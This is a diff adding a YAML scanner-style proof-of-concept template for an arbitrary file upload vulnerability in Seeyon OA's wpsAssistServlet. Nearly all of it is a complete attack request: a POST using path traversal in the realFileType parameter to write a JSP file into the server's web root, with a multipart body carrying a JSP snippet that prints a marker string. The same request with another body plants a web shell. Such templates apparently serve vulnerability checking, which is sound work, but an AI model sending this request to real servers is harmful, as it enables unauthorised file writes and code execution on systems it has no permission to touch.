@@ -1,0 +1,30 @@
+id:
+
+info:
+  name: 致远OA wpsAssistServlet任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/pajgatzw.jsp&fileId=2
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept: "*/*"
+    Connection: close
+    Content-Type: multipart/form-data; boundary=oklp586ac9dujytddee11e86fa698nmv
+  data: |
+    --oklp586ac9dujytddee11e86fa698nmv
+    Content-Disposition: form-data; name="upload"; filename="majgatzw.xls"
+    Content-Type: application/vnd.ms-excel
+  
+    <% out.println("lnrrovkexhsxbzjwptmthmyjgnvgjhjk");%>
+    --oklp586ac9dujytddee11e86fa698nmv--
+response1:
+  headers:
+  body: true
+  code:
+requests2:
+response2:
